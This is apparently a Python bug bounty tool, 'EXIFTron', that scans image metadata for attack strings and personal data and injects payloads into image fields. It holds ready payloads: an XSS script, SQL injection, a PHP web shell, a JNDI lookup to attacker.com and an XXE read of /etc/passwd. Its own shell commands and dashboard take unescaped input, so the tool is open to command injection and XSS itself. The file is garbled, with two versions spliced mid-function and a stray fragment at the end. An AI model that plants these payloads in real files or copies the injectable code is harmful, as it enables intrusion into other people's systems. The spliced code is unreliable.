#!/usr/bin/env python3
"""
Ultimate EXIFTron Bug Bounty Tool (with Custom Dashboard and Test Image Generator)

This tool extracts and analyzes EXIF metadata from images,
detects vulnerabilities and PII, allows payload injection for PoCs,
and provides a custom web dashboard to view results.
"""

import os
import re
import argparse
import subprocess
import requests
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# Try to import Flask for dashboard mode
try:
    from flask import Flask, render_template_string
except ImportError:
    Flask = None

# UI Setup
console = Console()
ROOT = Path(__file__).parent.resolve()
DOWNLOAD_DIR = ROOT / "downloaded_images"

# Global configuration for metadata fields, vulnerability, and PII patterns
TARGET_FIELDS = [
    "File Name", "Artist", "Copyright", "Comment", "Software", "Make", "Model",
    "Owner Name", "User Comment", "Author", "Description", "Keywords", "Title",
    "GPS Latitude", "GPS Longitude"
]

VULN_PATTERNS = {
    "XSS": [r"<script>", r"onerror=", r"javascript:"],
    "SQLi": [r"' OR 1=1 --", r"SELECT .* FROM", r"INSERT INTO", r"DROP TABLE"],
    "RCE": [r"<?php", r"system\(", r"cmd.exe", r"bash -c"],
    "LDAP Injection": [r"\$\{jndi:", r"ldap://"],
    "Secrets": [r"API_KEY", r"token", r"password", r"session"],
    "XXE": [r"<!ENTITY", r"file:///"],
    "SSTI": [r"\{\{.*?\}\}", r"\{\%.*?\%\}"],
    "Hardcoded Credentials": [r"username=", r"password="]
}

PII_PATTERNS = {
    "Email": [r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"],
    "Phone Number": [r"\+?\d{1,3}[-.\s]?\(?\d{2,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{4}"],
    "GPS Data": [r"(\d{1,2}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [NS]),\s*(\d{1,3}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [EW])"],
    "Username": [r"User[-\s]?[Nn]ame:\s*(\w+)"],
    "Password": [r"Password:\s*(\S+)"],
}

INJECTION_PAYLOADS = {
    "XSS": '<script>alert("XSS")</script>',
    "SQLi": "' OR 1=1 --",
    "RCE": "<?php system($_GET['cmd']); ?>",
    "LDAP": "${jndi:ldap://attacker.com}",
    "XXE": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
}

# --- EXIFTron Class Definition ---
class EXIFTron:
    def __init__(self):
        self.payloads = INJECTION_PAYLOADS
        self.report_data = []  # List of dictionaries with scan results

    def show_banner(self):
        banner = Panel(
            "🛡️ EXIFTron - **Ultimate EXIF Exploitation Framework**\n"
            "**Version**: 5.4 (Bug Bounty Edition) | **Author**: @Kdairatchi",
            style="bold blue"
        )
        console.print(banner)

    def extract_exif_data(self, image_path):
        """Extract EXIF metadata using exiftool with grep-like filtering."""
        try:
            cmd = f'exiftool "{image_path}" | grep -E "{ "|".join(TARGET_FIELDS) }"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
            exif_data = {}
            for line in result.split("\n"):
                if ": " in line:
                    key, value = line.split(": ", 1)
                    exif_data[key.strip()] = value.strip()
            # Ensure Author field exists: fallback to Artist if missing
            exif_data["Author"] = exif_data.get("Author") or exif_data.get("Artist", "N/A")
            return exif_data
        except Exception as e:
            console.print(f"[bold red]Error extracting EXIF data from {image_path}: {e}[/bold red]")
            return None

    def analyze_vulnerabilities(self, metadata):
        """Detect vulnerability patterns in metadata."""
        findings = []
        for field, content in metadata.items():
            for vuln_type, patterns in VULN_PATTERNS.items():
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in patterns):
                    findings.append(f"{vuln_type} ({field})")
        return findings

    def detect_pii(self, metadata):
        """Detect PII in metadata."""
        pii_findings = []
        for field, content in metadata.items():
            for pii_type, patterns in PII_PATTERNS.items():
                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        pii_findings.append(f"{pii_type} ({field}): {match.group(0)}")
        return pii_findings

    def format_gps(self, lat, lon):
        """Format GPS coordinates and generate a Google Maps link."""
        if lat == "N/A" or lon == "N/A":
            return "N/A", "N/A"
        try:
            formatted_lat = lat.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            formatted_lon = lon.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            map_link = f"https://www.google.com/maps?q={quote(formatted_lat)},{quote(formatted_lon)}"
            return f"{formatted_lat}, {formatted_lon}", map_link
        except Exception:
            return "N/A", "N/A"

    def inject_payload(self, image_path, payload_type, field="Comment"):
        """Inject a payload into a specified EXIF field."""
        if payload_type not in self.payloads:
            console.print("[bold red]Invalid payload type! Valid types: XSS, SQLi, RCE, LDAP, XXE[/bold red]")
            return
        payload = self.payloads[payload_type]
        console.print(f"[bold yellow]Injecting {payload_type} payload into {image_path} (field: {field})...[/bold yellow]")
        cmd = f'exiftool -{field}="{payload}" -overwrite_original "{image_path}"'
        subprocess.run(cmd, shell=True)

    def process_image(self, image_path):
        """Process a single image for vulnerabilities, PII, and metadata analysis."""
        metadata = self.extract_exif_data(image_path)
        if not metadata:
            return None
        vulnerabilities = self.analyze_vulnerabilities(metadata)
        pii_data = self.detect_pii(metadata)
        return {
            "File": image_path.name,
            "Vulnerabilities": ", ".join(vulnerabilities) if vulnerabilities else "None",
            "PII": ", ".join(pii_data) if pii_data else "None",
            "GPS": f'{metadata.get("GPS Latitude", "N/A")}, {metadata.get("GPS Longitude", "N/A")}',
            "Map Link": f'https://www.google.com/maps?q={metadata.get("GPS Latitude", "")},{metadata.get("GPS Longitude", "")}' if metadata.get("GPS Latitude") != "N/A" else "N/A",
            "Name": metadata.get("Author", "N/A"),
            "Software": metadata.get("Software", "N/A"),
            "Permissions": metadata.get("File Permissions", "N/A")
        }

    def batch_process(self, folder_path):
        """Batch process all images in a folder using parallel execution."""
        image_files = list(Path(folder_path).glob("*.jpg")) + \
                      list(Path(folder_path).glob("*.jpeg")) + \
                      list(Path(folder_path).glob("*.png"))
        if not image_files:
            console.print("[bold red]❌ No images found in the specified folder![/bold red]")
            return []
        console.print(f"[bold green]🔍 Processing {len(image_files)} images in batch mode...[/bold green]")
        results = []
        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
            for result in executor.map(self.process_image, image_files):
                if result:
                    results.append(result)
        return results

    def generate_report(self, metadata_list):
        """Generate a detailed bug bounty EXIF security report."""
        table = Table(title="📄 Bug Bounty EXIF Security Report", show_lines=True)
        table.add_column("File", style="cyan", overflow="fold")
        table.add_column("Vulnerabilities", style="red", overflow="fold")
        table.add_column("PII Found", style="yellow", overflow="fold")
        table.add_column("GPS Coordinates", style="green", overflow="fold")
        table.add_column("Map Link", style="blue", overflow="fold")
        table.add_column("Name", style="magenta", overflow="fold")
        table.add_column("Software", style="yellow", overflow="fold")
        table.add_column("Permissions", style="bold", overflow="fold")
        for metadata in metadata_list:
            gps_coords, map_link = self.format_gps(metadata.get("GPS Latitude", "N/A"), metadata.get("GPS Longitude", "N/A"))
            vulnerabilities_text = ", ".join(metadata.get("vulnerabilities", [])) if metadata.get("vulnerabilities") else "None"
            table.add_row(
                metadata.get("File", "Unknown"),
                vulnerabilities_text,
                metadata.get("PII", "None"),
                gps_coords,
                map_link,
                metadata.get("Name", "N/A"),
                metadata.get("Software", "N/A"),
                metadata.get("Permissions", "N/A")
            )
        console.print(table)
        with open("exif_scan_results.txt", "w") as f:
            for metadata in metadata_list:
                gps_coords, map_link = self.format_gps(metadata.get("GPS Latitude", "N/A"), metadata.get("GPS Longitude", "N/A"))
                vulnerabilities_text = ", ".join(metadata.get("vulnerabilities", [])) if metadata.get("vulnerabilities") else "None"
                f.write(f'{metadata.get("File", "Unknown")} | {vulnerabilities_text} | {metadata.get("PII", "None")} | {gps_coords} | {map_link} | {metadata.get("Name", "N/A")} | {metadata.get("Software", "N/A")} | {metadata.get("Permissions", "N/A")}\n')
        console.print("[bold green]✅ Scan completed. Results saved to exif_scan_results.txt[/bold green]")

# --- Custom Dashboard using Flask & Bootstrap ---
def start_dashboard(results, host="0.0.0.0", port=5000):
    if not Flask:
        console.print("[bold red]Flask is not installed. Dashboard mode unavailable.[/bold red]")
        sys.exit(1)
    app = Flask(__name__)
    template = """
    <!doctype html>
    <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>EXIFTron Bug Bounty Dashboard</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
      </head>
      <body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
          <a class="navbar-brand" href="#">EXIFTron Dashboard</a>
        </nav>
        <div class="container mt-4">
          <h1 class="mb-4">Bug Bounty EXIF Security Report</h1>
          <table class="table table-striped table-bordered">
            <thead class="thead-dark">
              <tr>
                <th>File</th>
                <th>Vulnerabilities</th>
                <th>PII Found</th>
                <th>GPS Coordinates</th>
                <th>Map Link</th>
                <th>Name</th>
                <th>Software</th>
                <th>Permissions</th>
              </tr>
            </thead>
            <tbody>
              {% for res in results %}
              <tr>
                <td>{{ res["File"] }}</td>
                <td>{{ res["Vulnerabilities"] }}</td>
                <td>{{ res["PII"] }}</td>
                <td>{{ res["GPS"] }}</td>
                <td>{% if res["Map Link"] != "N/A" %}<a href="{{ res["Map Link"] }}" target="_blank">View Map</a>{% else %}N/A{% endif %}</td>
                <td>{{ res["Name"] }}</td>
                <td>{{ res["Software"] }}</td>
                <td>{{ res["Permissions"] }}</td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
      </body>
    </html>
    """
    @app.route("/")
    def dashboard():
        return render_template_string(template, results=results)
    console.print(f"[bold green]Starting dashboard on http://{host}:{port}[/bold green]")
    app.run(host=host, port=port)

def main():
    tool = EXIFTron()
    tool.show_banner()

   #!/usr/bin/env python3
"""
Ultimate EXIFTron Bug Bounty Tool (v6.0 - Bug Bounty Edition)

Features:
- Extracts EXIF metadata from images (local file, URL, domain, batch)
- Detects vulnerabilities (XSS, SQLi, RCE, LDAP Injection, XXE, SSTI, etc.)
- Detects PII (emails, phone numbers, GPS data, usernames, passwords)
- Payload injection for PoC generation (into specified metadata fields)
- Downloads images from URLs and extracts HTML title
- Domain scanning: fetch homepage title and capture a unique screenshot (via Selenium)
- Batch processing with parallel execution
- Generates detailed CLI report and saves it to file
- Launches a live, custom web dashboard (Flask + Bootstrap + SocketIO) with dynamic updates
- Test mode to generate a sample image with preset payloads

Author: @Kdairatchi | Version: 6.0 (Bug Bounty Edition)
"""

import os
import re
import argparse
import subprocess
import requests
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# Additional libraries for URL/domain processing
from bs4 import BeautifulSoup

# Try to import Flask and Flask-SocketIO for dashboard mode
try:
    from flask import Flask, render_template_string
    from flask_socketio import SocketIO
except ImportError:
    print("[ERROR] Flask and Flask-SocketIO are required for dashboard mode. Run: pip install flask flask-socketio")
    exit(1)

# Try to import Selenium for screenshot capture (if available)
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ImportError:
    webdriver = None

# UI Setup
console = Console()
ROOT = Path(__file__).parent.resolve()
DOWNLOAD_DIR = ROOT / "downloaded_images"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# Global configuration for metadata fields, vulnerability and PII patterns
TARGET_FIELDS = [
    "File Name", "Artist", "Copyright", "Comment", "Software", "Make", "Model",
    "Owner Name", "User Comment", "Author", "Description", "Keywords", "Title",
    "GPS Latitude", "GPS Longitude"
]

VULN_PATTERNS = {
    "XSS": [r"<script>", r"onerror=", r"javascript:"],
    "SQLi": [r"' OR 1=1 --", r"SELECT .* FROM", r"INSERT INTO", r"DROP TABLE"],
    "RCE": [r"<?php", r"system\(", r"cmd.exe", r"bash -c"],
    "LDAP Injection": [r"\$\{jndi:", r"ldap://"],
    "Secrets": [r"API_KEY", r"token", r"password", r"session"],
    "XXE": [r"<!ENTITY", r"file:///"],
    "SSTI": [r"\{\{.*?\}\}", r"\{\%.*?\%\}"],
    "Hardcoded Credentials": [r"username=", r"password="]
}

PII_PATTERNS = {
    "Email": [r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"],
    "Phone Number": [r"\+?\d{1,3}[-.\s]?\(?\d{2,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{4}"],
    "GPS Data": [r"(\d{1,2}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [NS]),\s*(\d{1,3}°\s*\d{1,2}'\s*\d{1,2}.\d+\" [EW])"],
    "Username": [r"User[-\s]?[Nn]ame:\s*(\w+)"],
    "Password": [r"Password:\s*(\S+)"],
}

INJECTION_PAYLOADS = {
    "XSS": '<script>alert("XSS")</script>',
    "SQLi": "' OR 1=1 --",
    "RCE": "<?php system($_GET['cmd']); ?>",
    "LDAP": "${jndi:ldap://attacker.com}",
    "XXE": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
}

# --- Flask Dashboard Setup ---
app = Flask(__name__)
socketio = SocketIO(app)
LIVE_RESULTS = []  # Global variable for live scan updates

# --- EXIFTron Class Definition ---
class EXIFTron:
    def __init__(self):
        self.payloads = INJECTION_PAYLOADS
        self.report_data = []  # List of dictionaries with scan results

    def show_banner(self):
        banner = Panel(
            "🛡️ EXIFTron - **Ultimate EXIF Exploitation Framework**\n"
            "**Version**: 6.0 (Bug Bounty Edition) | **Author**: @Kdairatchi",
            style="bold blue"
        )
        console.print(banner)

    def extract_exif_data(self, image_path):
        """Extract EXIF metadata using exiftool."""
        try:
            cmd = f'exiftool "{image_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
            exif_data = {}
            for line in result.split("\n"):
                if ": " in line:
                    key, value = line.split(": ", 1)
                    exif_data[key.strip()] = value.strip()
            # Ensure Author is set (fallback to Artist)
            exif_data["Author"] = exif_data.get("Author") or exif_data.get("Artist", "N/A")
            return exif_data
        except Exception as e:
            console.print(f"[bold red]Error extracting EXIF data from {image_path}: {e}[/bold red]")
            return None

    def analyze_vulnerabilities(self, metadata):
        """Detect vulnerability patterns in metadata."""
        findings = []
        for field, content in metadata.items():
            for vuln_type, patterns in VULN_PATTERNS.items():
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in patterns):
                    findings.append(f"{vuln_type} ({field})")
        return findings

    def detect_pii(self, metadata):
        """Detect PII in metadata."""
        pii_findings = []
        for field, content in metadata.items():
            for pii_type, patterns in PII_PATTERNS.items():
                for pattern in patterns:
                    match = re.search(pattern, content, re.IGNORECASE)
                    if match:
                        pii_findings.append(f"{pii_type} ({field}): {match.group(0)}")
        return pii_findings

    def format_gps(self, lat, lon):
        """Format GPS coordinates and generate a Google Maps link."""
        if lat == "N/A" or lon == "N/A":
            return "N/A", "N/A"
        try:
            formatted_lat = lat.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            formatted_lon = lon.replace(" deg ", "°").replace("'", "′").replace("\"", "″")
            map_link = f"https://www.google.com/maps?q={quote(formatted_lat)},{quote(formatted_lon)}"
            return f"{formatted_lat}, {formatted_lon}", map_link
        except Exception:
            return "N/A", "N/A"

    def inject_payload(self, image_path, payload_type, field="Comment"):
        """Inject a payload into a specified EXIF field."""
        if payload_type not in self.payloads:
            console.print("[bold red]Invalid payload type! Valid types: XSS, SQLi, RCE, LDAP, XXE[/bold red]")
            return
        payload = self.payloads[payload_type]
        console.print(f"[bold yellow]Injecting {payload_type} payload into {image_path} (field: {field})...[/bold yellow]")
        cmd = f'exiftool -{field}="{payload}" -overwrite_original "{image_path}"'
        subprocess.run(cmd, shell=True)

    def process_image(self, image_path):
        """Process a single image for metadata analysis, vulnerability and PII detection."""
        metadata = self.extract_exif_data(image_path)
        if not metadata:
            return None
        vulnerabilities = self.analyze_vulnerabilities(metadata)
        pii_data = self.detect_pii(metadata)
        result = {
            "File": image_path.name,
            "Vulnerabilities": ", ".join(vulnerabilities) if vulnerabilities else "None",
            "PII": ", ".join(pii_data) if pii_data else "None",
            "GPS": f'{metadata.get("GPS Latitude", "N/A")}, {metadata.get("GPS Longitude", "N/A")}',
            "Map Link": f'https://www.google.com/maps?q={metadata.get("GPS Latitude", "")},{metadata.get("GPS Longitude", "")}' if metadata.get("GPS Latitude") != "N/A" else "N/A",
            "Name": metadata.get("Author", "N/A"),
            "Software": metadata.get("Software", "N/A"),
            "Permissions": metadata.get("File Permissions", "N/A"),
            "Title": metadata.get("Title", "N/A"),
            "Screenshot": "N/A"
        }
        return result

    def batch_process(self, folder_path):
        """Batch process all images in a folder using parallel execution."""
        image_files = list(Path(folder_path).rglob("*.jpg")) + \
                      list(Path(folder_path).rglob("*.jpeg")) + \
                      list(Path(folder_path).rglob("*.png"))
        if not image_files:
            console.print("[bold red]❌ No images found in the specified folder![/bold red]")
            return []
        console.print(f"[bold green]🔍 Processing {len(image_files)} images in batch mode...[/bold green]")
        results = []
        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
            for result in executor.map(self.process_image, image_files):
                if result:
                    results.append(result)
        return results

    def generate_report(self, metadata_list):
        """Generate a detailed bug bounty EXIF security report."""
        table = Table(title="📄 Bug Bounty EXIF Security Report", show_lines=True)
        table.add_column("File", style="cyan", overflow="fold")
        table.add_column("Vulnerabilities", style="red", overflow="fold")
        table.add_column("PII Found", style="yellow", overflow="fold")
        table.add_column("GPS Coordinates", style="green", overflow="fold")
        table.add_column("Map Link", style="blue", overflow="fold")
        table.add_column("Name", style="magenta", overflow="fold")
        table.add_column("Software", style="yellow", overflow="fold")
        table.add_column("Permissions", style="bold", overflow="fold")
        table.add_column("Title", style="white", overflow="fold")
        table.add_column("Screenshot", style="cyan", overflow="fold")
        for metadata in metadata_list:
            gps_coords, map_link = self.format_gps(metadata.get("GPS Latitude", "N/A"), metadata.get("GPS Longitude", "N/A"))
            vulnerabilities_text = ", ".join(metadata.get("vulnerabilities", [])) if metadata.get("vulnerabilities") else "None"
            table.add_row(
                metadata.get("File", "Unknown"),
                vulnerabilities_text,
                metadata.get("PII", "None"),
                gps_coords,
                map_link,
                metadata.get("Name", "N/A"),
                metadata.get("Software", "N/A"),
                metadata.get("Permissions", "N/A"),
                metadata.get("Title", "N/A"),
                metadata.get("Screenshot", "N/A")
            )
        console.print(table)
        with open("exif_scan_results.txt", "w") as f:
            for metadata in metadata_list:
                gps_coords, map_link = self.format_gps(metadata.get("GPS Latitude", "N/A"), metadata.get("GPS Longitude", "N/A"))
                vulnerabilities_text = ", ".join(metadata.get("vulnerabilities", [])) if metadata.get("vulnerabilities") else "None"
                f.write(f'{metadata.get("File", "Unknown")} | {vulnerabilities_text} | {metadata.get("PII", "None")} | {gps_coords} | {map_link} | {metadata.get("Name", "N/A")} | {metadata.get("Software", "N/A")} | {metadata.get("Permissions", "N/A")} | {metadata.get("Title", "N/A")} | {metadata.get("Screenshot", "N/A")}\n')
        console.print("[bold green]✅ Scan completed. Results saved to exif_scan_results.txt[/bold green]")

# ---- URL & Domain Processing Functions ----
def process_url(url, tool):
    """Process an image URL: download image (if applicable) and extract HTML title."""
    try:
        r = requests.get(url, timeout=10)
        if r.ok:
            soup = BeautifulSoup(r.text, "html.parser")
            title = soup.title.string.strip() if soup.title else "N/A"
        else:
            title = "N/A"
    except Exception as e:
        title = "N/A"
    ext = url.split('.')[-1].lower()
    if ext in ['jpg', 'jpeg', 'png']:
        local_file = ROOT / f"temp_downloaded_image.{ext}"
        with open(local_file, "wb") as f:
            f.write(r.content)
        result = tool.process_image(local_file)
        if result:
            result["Title"] = title
        return result
    else:
        return {"File": url, "Vulnerabilities": "N/A", "PII": "N/A", "GPS": "N/A", "Map Link": "N/A", "Name": title, "Software": "N/A", "Permissions": "N/A", "Title": title, "Screenshot": "N/A"}

def process_domain(domain, tool):
    """Process a domain: fetch homepage title and capture a screenshot."""
    if not domain.startswith("http"):
        url = "http://" + domain
    else:
        url = domain
    try:
        r = requests.get(url, timeout=10)
        if r.ok:
            soup = BeautifulSoup(r.text, "html.parser")
            title = soup.title.string.strip() if soup.title else "N/A"
        else:
            title = "N/A"
    except Exception as e:
        title = "N/A"
    screenshot_path = "N/A"
    if webdriver:
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            screenshot_dir = ROOT / "screenshots"
            screenshot_dir.mkdir(exist_ok=True)
            screenshot_path = str(screenshot_dir / (domain.replace(".", "_") + ".png"))
            driver.save_screenshot(screenshot_path)
            driver.quit()
        except Exception as e:
            screenshot_path = "N/A"
    return {"File": domain, "Vulnerabilities": "N/A", "PII": "N/A", "GPS": "N/A", "Map Link": "N/A", "Name": title, "Software": "N/A", "Permissions": "N/A", "Title": title, "Screenshot": screenshot_path}

# ---- Live Dashboard using Flask, SocketIO, and Bootstrap ----
app = Flask(__name__)
socketio = SocketIO(app)

@app.route("/")
def dashboard():
    return render_template_string(DASHBOARD_HTML, results=LIVE_RESULTS)

DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>EXIFTron Bug Bounty Dashboard</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        var socket = io();
        socket.on("connect", function() {
          console.log("Connected to live dashboard.");
        });
        socket.on("update_scan", function(data) {
          var tbody = document.getElementById("results-body");
          tbody.innerHTML = "";
          data.forEach(function(res) {
            var row = `<tr>
              <td>${res.File}</td>
              <td>${res.Vulnerabilities}</td>
              <td>${res.PII}</td>
              <td>${res.GPS}</td>
              <td>${res.Map_Link}</td>
              <td>${res.Name}</td>
              <td>${res.Software}</td>
              <td>${res.Permissions}</td>
              <td>${res.Title}</td>
              <td>${res.Screenshot != "N/A" ? '<a href="' + res.Screenshot + '" target="_blank">View</a>' : "N/A"}</td>
            </tr>`;
            tbody.innerHTML += row;
          });
        });
        // Request updates every 5 seconds
        setInterval(function(){
          socket.emit("request_update");
        }, 5000);
      });
    </script>
  </head>
  <body class="bg-dark text-white">
    <div class="container mt-4">
      <h1 class="mb-4">📊 EXIFTron Live Dashboard</h1>
      <table class="table table-striped table-dark">
        <thead>
          <tr>
            <th>File</th>
            <th>Vulnerabilities</th>
            <th>PII Found</th>
            <th>GPS Coordinates</th>
            <th>Map Link</th>
            <th>Name</th>
            <th>Software</th>
            <th>Permissions</th>
            <th>Title</th>
            <th>Screenshot</th>
          </tr>
        </thead>
        <tbody id="results-body">
          {% for res in results %}
          <tr>
            <td>{{ res["File"] }}</td>
            <td>{{ res["Vulnerabilities"] }}</td>
            <td>{{ res["PII"] }}</td>
            <td>{{ res["GPS"] }}</td>
            <td>{% if res["Map Link"] != "N/A" %}<a href="{{ res["Map Link"] }}" target="_blank">View Map</a>{% else %}N/A{% endif %}</td>
            <td>{{ res["Name"] }}</td>
            <td>{{ res["Software"] }}</td>
            <td>{{ res["Permissions"] }}</td>
            <td>{{ res["Title"] }}</td>
            <td>{% if res["Screenshot"] != "N/A" %}<a href="{{ res["Screenshot"] }}" target="_blank">View</a>{% else %}N/A{% endif %}</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
"""

@socketio.on("request_update")
def send_update():
    socketio.emit("update_scan", [format_dashboard_row(r) for r in LIVE_RESULTS])

def format_dashboard_row(result):
    # Convert dictionary keys for use in dashboard template (replace spaces with underscores)
    return {
        "File": result.get("File", "N/A"),
        "Vulnerabilities": result.get("Vulnerabilities", "N/A"),
        "PII": result.get("PII", "N/A"),
        "GPS": result.get("GPS", "N/A"),
        "Map_Link": result.get("Map Link", "N/A"),
        "Name": result.get("Name", "N/A"),
        "Software": result.get("Software", "N/A"),
        "Permissions": result.get("Permissions", "N/A"),
        "Title": result.get("Title", "N/A"),
        "Screenshot": result.get("Screenshot", "N/A")
    }

# ---- URL & Domain Processing ----
def process_url(url, tool):
    """Process an image URL: download if image and extract HTML title."""
    try:
        r = requests.get(url, timeout=10)
        if r.ok:
            soup = BeautifulSoup(r.text, "html.parser")
            title = soup.title.string.strip() if soup.title else "N/A"
        else:
            title = "N/A"
    except Exception:
        title = "N/A"
    ext = url.split('.')[-1].lower()
    if ext in ['jpg', 'jpeg', 'png']:
        local_file = ROOT / f"temp_downloaded_image.{ext}"
        with open(local_file, "wb") as f:
            f.write(r.content)
        result = tool.process_image(local_file)
        if result:
            result["Title"] = title
        return result
    else:
        return {"File": url, "Vulnerabilities": "N/A", "PII": "N/A", "GPS": "N/A",
                "Map Link": "N/A", "Name": title, "Software": "N/A", "Permissions": "N/A",
                "Title": title, "Screenshot": "N/A"}

def process_domain(domain, tool):
    """Process a domain: fetch homepage title and capture a screenshot."""
    if not domain.startswith("http"):
        url = "http://" + domain
    else:
        url = domain
    try:
        r = requests.get(url, timeout=10)
        if r.ok:
            soup = BeautifulSoup(r.text, "html.parser")
            title = soup.title.string.strip() if soup.title else "N/A"
        else:
            title = "N/A"
    except Exception:
        title = "N/A"
    screenshot_path = "N/A"
    if webdriver:
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            screenshot_dir = ROOT / "screenshots"
            screenshot_dir.mkdir(exist_ok=True)
            screenshot_path = str(screenshot_dir / (domain.replace(".", "_") + ".png"))
            driver.save_screenshot(screenshot_path)
            driver.quit()
        except Exception:
            screenshot_path = "N/A"
    return {"File": domain, "Vulnerabilities": "N/A", "PII": "N/A", "GPS": "N/A",
            "Map Link": "N/A", "Name": title, "Software": "N/A", "Permissions": "N/A",
            "Title": title, "Screenshot": screenshot_path}

# ---- Main Execution ----
def main():
    tool = EXIFTron()
    tool.show_banner()

    parser = argparse.ArgumentParser(description="EXIFTron: Ultimate Bug Bounty EXIF Scanner, Exploiter & PoC Generator")
    parser.add_argument("-i", "--image", help="Path to an image file")
    parser.add_argument("-u", "--url", help="Extract EXIF from an image URL")
    parser.add_argument("-d", "--domain", help="Scan an entire domain for images with EXIF metadata")
    parser.add_argument("-w", "--wayback", action="store_true", help="Extract images from Wayback Machine")
    parser.add_argument("-b", "--batch", help="Batch process all images in a folder")
    parser.add_argument("-e", "--extract", action="store_true", help="Extract EXIF data")
    parser.add_argument("-c", "--clean", action="store_true", help="Remove EXIF metadata")
    parser.add_argument("-g", "--gps", action="store_true", help="Extract GPS coordinates and map link")
    parser.add_argument("-r", "--reverse", action="store_true", help="Perform reverse image search")
    parser.add_argument("-a", "--attack", action="store_true", help="Automate EXIF-based attacks")
    parser.add_argument("-p", "--payload", help="Inject a payload into EXIF metadata (e.g. XSS, SQLi, RCE, LDAP, XXE)")
    parser.add_argument("-f", "--field", default="Comment", help="EXIF field to inject payload (default: Comment)")
    parser.add_argument("-report", "--report", action="store_true", help="Generate a full EXIF security report")
    parser.add_argument("--dashboard", action="store_true", help="Launch live web dashboard to view results")
    parser.add_argument("--test", action="store_true", help="Generate a test image with payloads for PoC")

    args = parser.parse_args()
    results = []

    if args.test:
        from PIL import Image
        img = Image.new('RGB', (800, 800), color='red')
        test_image = ROOT / "test_image.jpg"
        img.save(test_image)
        test_payloads = {
            'Comment': '<script>alert("XSS")</script>',
            'Artist': "' OR 1=1 -- -",
            'Copyright': '<?php system($_GET["cmd"]); ?>',
            'GPS Latitude': '37 deg 46\' 26.00"',
            'GPS Longitude': '122 deg 25\' 52.00"',
            'Software': 'SecretApp v1.3.7',
            'Make': 'TestDevice ${jndi:ldap://attacker.com}'
        }
        for field, value in test_payloads.items():
            subprocess.run([
                'exiftool',
                f'-{field}={value}',
                '-overwrite_original',
                str(test_image)
            ], capture_output=True)
        console.print(f"[bold green]Test image created: {test_image}[/bold green]")
        subprocess.run(['exiftool', str(test_image)], check=True)
        exit(0)

    if args.image:
        # Process local image
        res = tool.process_image(Path(args.image))
        if res:
            results.append(res)
    elif args.batch:
        results = tool.batch_process(args.batch)
    elif args.url:
        res = process_url(args.url, tool)
        if res:
            results.append(res)
    elif args.domain:
        res = process_domain(args.domain, tool)
        if res:
            results.append(res)
    elif args.payload and args.image:
        tool.inject_payload(Path(args.image), args.payload, args.field)
        res = tool.process_image(Path(args.image))
        if res:
            results.append(res)
    # URL, domain, and wayback scanning placeholders can be extended further.

    if results:
        if args.report:
            tool.generate_report(results)
        # Append new results to live global results
        global LIVE_RESULTS
        LIVE_RESULTS = results
        if args.dashboard:
            console.print("[bold green]Launching Live Dashboard at http://127.0.0.1:1337[/bold green]")
            socketio.run(app, host="0.0.0.0", port=1337, debug=True)
    else:
        console.print("[bold red]No results to display.[/bold red]")

if __name__ == "__main__":
    main()

    args = parser.parse_args()
    results = []

    if args.test:
        # Create a test image with preset payloads for PoC demonstration
        from PIL import Image
        img = Image.new('RGB', (800, 800), color='red')
        test_image = ROOT / "test_image.jpg"
        img.save(test_image)
